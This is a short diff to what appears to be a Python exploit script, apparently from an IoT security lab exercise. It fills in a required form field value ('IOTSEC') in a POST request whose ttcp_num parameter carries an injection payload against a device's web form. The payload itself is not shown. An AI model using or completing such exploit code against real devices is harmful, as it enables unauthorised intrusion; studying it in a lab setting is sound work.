@@ -101,7 +101,7 @@ def execute_exploit():
    post_data += "submit_type=&"
    post_data += "action=&"
    post_data += "commit=0&"
-   post_data += "HIT2=WHATVALUEGOESHERE?&" # MODIFY THIS LINE!
+   post_data += "HIT2=IOTSEC&" # HIT2 needs to be equals to "IOTSEC"
    post_data += f"ttcp_num={payload}&"
    post_data += "ttcp_size=&"
    post_data += "ttcp_ip=&"
